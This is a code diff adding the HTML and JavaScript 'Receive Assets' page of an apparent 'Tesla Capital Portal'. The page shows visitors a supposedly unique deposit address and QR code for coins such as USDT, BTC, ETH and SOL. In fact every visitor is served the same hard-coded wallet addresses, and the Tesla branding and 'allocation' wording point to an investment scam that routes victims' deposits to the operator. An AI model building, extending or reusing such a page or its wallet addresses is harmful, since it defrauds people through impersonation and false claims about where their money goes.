@@ -1,1 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Receive Assets</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    </style>
+</head>
+<body class="text-white min-h-screen flex flex-col justify-between pb-8">
 
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#1c1c1c] bg-[#0d0d0d]">
+        <a href="dashboard.html" class="text-neutral-400 hover:text-white flex items-center text-sm">
+            ‹ Back to Hub
+        </a>
+        <span class="text-xs font-bold tracking-widest text-[#E82127] uppercase">Inbound Terminal</span>
+        <div class="w-12"></div>
+    </header>
+
+    <main class="max-w-md w-full mx-auto px-4 mt-6 flex-grow">
+        <div class="bg-[#141414] border border-[#222] rounded-2xl p-5 shadow-2xl text-center space-y-5">
+            
+            <div class="text-left">
+                <h2 class="text-xl font-bold tracking-tight mb-1">Receive Digital Assets</h2>
+                <p class="text-xs text-neutral-400">Select a target token infrastructure network to display your incoming allocation address.</p>
+            </div>
+
+            <!-- Asset Selection Dropdown -->
+            <div class="text-left">
+                <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500 mb-2">Select Network Infrastructure</label>
+                <select id="assetSelect" onchange="updateReceiveInterface()" class="w-full bg-[#1c1c1c] border border-[#333] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#E82127] text-sm font-medium">
+                    <option value="USDT (TRC20)">USDT (Tron Network - TRC20)</option>
+                    <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+                    <option value="Ethereum (ETH)">Ethereum (ERC20)</option>
+                    <option value="USDC (ERC20)">USD Coin (Ethereum - ERC20)</option>
+                    <option value="USDT (ERC20)">USDT (Ethereum - ERC20)</option>
+                    <option value="Solana (SOL)">Solana (SOL)</option>
+                    <option value="Litecoin (LTC)">Litecoin (LTC)</option>
+                    <option value="XRP (XRP)">XRP (XRP)</option>
+                    <option value="Tron (TRX)">Tron (TRX)</option>
+                    <option value="Dash (DASH)">Dash (DASH)</option>
+                </select>
+            </div>
+
+            <!-- Dynamic Warning Banner -->
+            <div class="bg-[#241a0d] border border-[#3d2a13] rounded-xl p-3 text-left flex items-start space-x-2.5">
+                <span class="text-[#f0a23e] text-sm mt-0.5">⚠️</span>
+                <p class="text-[11px] text-[#f0a23e] font-medium leading-normal">
+                    Ensure you send only <span id="bannerAsset">USDT (TRC20)</span> tokens to this address. Sending unmapped assets results in unrecoverable losses.
+                </p>
+            </div>
+
+            <!-- QR Display Matrix -->
+            <div class="bg-white rounded-2xl p-4 inline-block shadow-lg">
+                <img id="qrCodeImg" src="" alt="Receiver QR Code" class="w-44 h-44 mx-auto">
+                <p class="text-[11px] text-neutral-500 font-bold tracking-tight mt-2" id="walletLabel">USDT (TRC20)</p>
+            </div>
+
+            <!-- Interactive Copy Output Field -->
+            <div class="text-left space-y-1.5">
+                <label class="block text-[10px] font-bold uppercase tracking-wider text-neutral-500">Your Unique Inbound Terminal Address</label>
+                <div class="bg-[#1c1c1c] border border-[#282828] rounded-xl p-3 font-mono text-xs text-neutral-300 flex justify-between items-center gap-3">
+                    <span id="walletAddress" class="break-all tracking-tight select-all">Fetching...</span>
+                    <button type="button" onclick="copyWalletAddress()" class="bg-neutral-800 hover:bg-neutral-700 active:bg-neutral-600 p-2.5 rounded-lg transition-all flex items-center justify-center shrink-0 border border-neutral-700">
+                        <svg id="copyIcon" class="w-4 h-4 text-neutral-300" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+                        </svg>
+                        <span id="copyTxt" class="hidden text-[10px] font-bold text-emerald-400 px-1">Copied!</span>
+                    </button>
+                </div>
+            </div>
+
+            <div class="pt-2">
+                <a href="dashboard.html" class="w-full bg-neutral-900 hover:bg-neutral-800 text-neutral-400 font-medium py-3 rounded-xl block transition-all text-xs border border-neutral-800">
+                    Return to Hub Account Profile
+                </a>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const userId = localStorage.getItem("userId");
+
+        const wallets = {
+            "Dash (DASH)": {
+                address: "XaqwuuFddEwm2Q9yPW3kf1JWavRkNYpi2j",
+                label: "Dash (DASH)"
+            },
+            "Litecoin (LTC)": {
+                address: "ltc1q0a8k5xvcks3xqj38stjk33mhde3mjjh95v2t7j",
+                label: "Litecoin (LTC)"
+            },
+            "XRP (XRP)": {
+                address: "rHpjJPKYbjaZ6u5uKf9QVuEQCiy7duLo1Q",
+                label: "XRP (XRP)"
+            },
+            "Tron (TRX)": {
+                address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6",
+                label: "Tron (TRX)"
+            },
+            "USDC (ERC20)": {
+                address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
+                label: "USD Coin (ERC20)"
+            },
+            "USDT (ERC20)": {
+                address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
+                label: "USDT (ERC20)"
+            },
+            "Ethereum (ETH)": {
+                address: "0x9809f464AC566eD2A5C29A3fb91b7e74614CaA80",
+                label: "Ethereum (ETH)"
+            },
+            "Solana (SOL)": {
+                address: "3o1XwD4bUB5RjrC4xwG3h6C8eZRhdmNqPpU8bQhXdc5b",
+                label: "Solana (SOL)"
+            },
+            "Bitcoin (BTC)": {
+                address: "bc1q4vax6xwa2m7ukh0kkqc6kcs6a9eltfn50d8z8e",
+                label: "Bitcoin (BTC)"
+            },
+            "USDT (TRC20)": {
+                address: "TTH6ms4CCRVAqJQTVmtjj48UZArSswBQL6",
+                label: "Tether USDT (TRC20)"
+            }
+        };
+
+        if (!userId) {
+            window.location.href = "index.html";
+        }
+
+        function updateReceiveInterface() {
+            const asset = document.getElementById('assetSelect').value;
+            const currentWallet = wallets[asset];
+
+            document.getElementById('walletAddress').innerText = currentWallet.address;
+            document.getElementById('bannerAsset').innerText = currentWallet.label;
+            document.getElementById('walletLabel').innerText = currentWallet.label;
+            
+            // Generate QR representation array instantly
+            document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=176x176&data=${encodeURIComponent(currentWallet.address)}`;
+        }
+
+        async function copyWalletAddress() {
+            const addressText = document.getElementById('walletAddress').innerText;
+            const copyIcon = document.getElementById('copyIcon');
+            const copyTxt = document.getElementById('copyTxt');
+
+            try {
+                await navigator.clipboard.writeText(addressText);
+                copyIcon.classList.add('hidden');
+                copyTxt.classList.remove('hidden');
+                setTimeout(() => {
+                    copyTxt.classList.add('hidden');
+                    copyIcon.classList.remove('hidden');
+                }, 2000);
+            } catch (err) {
+                const el = document.createElement('textarea');
+                el.value = addressText;
+                document.body.appendChild(el);
+                el.select();
+                document.execCommand('copy');
+                document.body.removeChild(el);
+            }
+        }
+
+        // Run system allocation on initial page initialization mount
+        window.addEventListener('DOMContentLoaded', updateReceiveInterface);
+    </script>
+</body>
+</html>
